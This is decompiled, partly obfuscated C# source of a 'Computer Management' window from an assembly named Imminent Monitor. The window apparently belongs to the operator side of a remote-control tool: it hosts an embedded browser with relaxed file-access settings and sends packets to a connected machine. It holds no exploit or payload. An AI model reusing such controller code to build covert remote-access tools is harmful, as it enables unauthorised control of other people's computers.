// Decompiled with JetBrains decompiler
// Type: FormManagement
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using CefSharp;
using CefSharp.WinForms;
using ImminentMonitor.Cef;
using Microsoft.VisualBasic.CompilerServices;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormManagement : Form
{
  private IContainer icontainer_0;
  public GClass18 gclass18_0;
  private ChromiumWebBrowser chromiumWebBrowser_0;

  public FormManagement(GClass18 gclass18_1)
  {
    this.InitializeComponent();
    this.gclass18_0 = gclass18_1;
    this.method_0();
    this.Text = string.Format("{0}/{1}", (object) this.gclass18_0.method_20().string_15, (object) this.gclass18_0.method_20().string_1);
    this.MinimumSize = new Size(908, 659);
    Class97.smethod_11((Form) this);
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (FormManagement));
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    this.ClientSize = new Size(892, 620);
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
    this.Name = nameof (FormManagement);
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "X/X - Computer Management";
    this.ResumeLayout(false);
  }

  public virtual ChromiumWebBrowser vmethod_0() => this.chromiumWebBrowser_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public virtual void vmethod_1(ChromiumWebBrowser chromiumWebBrowser_1) => this.chromiumWebBrowser_0 = chromiumWebBrowser_1;

  private void method_0()
  {
    string path = string.Format("{0}\\bin\\cef\\site\\base\\html\\imminent\\comp-management.html", (object) Application.StartupPath);
    if (!File.Exists(path))
    {
      int num = (int) MessageBox.Show("Error The html file doesn't exists : " + path);
      this.Close();
    }
    this.vmethod_1(new ChromiumWebBrowser(path));
    ((Control) this.vmethod_0()).AllowDrop = false;
    ((Control) this.vmethod_0()).Dock = DockStyle.Fill;
    this.Controls.Add((Control) this.vmethod_0());
    this.vmethod_0().BrowserSettings = new BrowserSettings()
    {
      FileAccessFromFileUrls = (CefState) 1,
      UniversalAccessFromFileUrls = (CefState) 1,
      WebSecurity = (CefState) 1
    };
    this.vmethod_0().RegisterJsObject("computerManagement", (object) new CompCefHandler(this), (BindingOptions) null);
  }

  public void method_1(
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.MiscPacket miscPacket_0)
  {
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_2(this.gclass18_0, new object[2]
    {
      (object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Misc,
      (object) miscPacket_0
    });
  }
}
